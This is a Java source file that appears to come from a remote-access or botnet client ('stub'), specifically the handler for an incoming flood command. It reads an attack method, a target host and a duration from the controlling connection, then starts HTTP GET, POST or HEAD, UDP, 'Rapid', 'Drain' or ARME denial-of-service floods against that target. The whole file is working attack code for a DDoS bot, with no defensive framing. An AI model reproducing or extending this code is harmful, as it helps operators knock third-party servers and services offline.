package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.common.Flood;
import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Constants;
import com.redpois0n.stub.flood.ARME;
import com.redpois0n.stub.flood.Drain;
import com.redpois0n.stub.flood.HTTP;
import com.redpois0n.stub.flood.Rapid;
import com.redpois0n.stub.flood.ThreadFlood;
import com.redpois0n.stub.flood.UDP;

public class Packet22Flood extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int method = Connection.readInt();
		String target = Connection.readLine();
		int seconds = Connection.readInt();
		
		new ThreadFlood(seconds).start();
				
		if (method == Flood.GET.getNumeric()) {
			new HTTP(target, Constants.HTTP_GET).start();
		} else if (method == Flood.POST.getNumeric()) {
			new HTTP(target, Constants.HTTP_POST).start();
		} else if (method == Flood.HEAD.getNumeric()) {
			new HTTP(target, Constants.HTTP_HEAD).start();
		} else if (method == Flood.UDP.getNumeric()) {
			new UDP(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
		} else if (method == Flood.RAPID.getNumeric()) {
			new Rapid(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
		} else if (method == Flood.DRAIN.getNumeric()) {
			new Drain(target).start();
		} else if (method == Flood.ARME.getNumeric()) {
			new ARME(target.split(":")[0], Integer.parseInt(target.split(":")[1])).start();
		}
	}

}
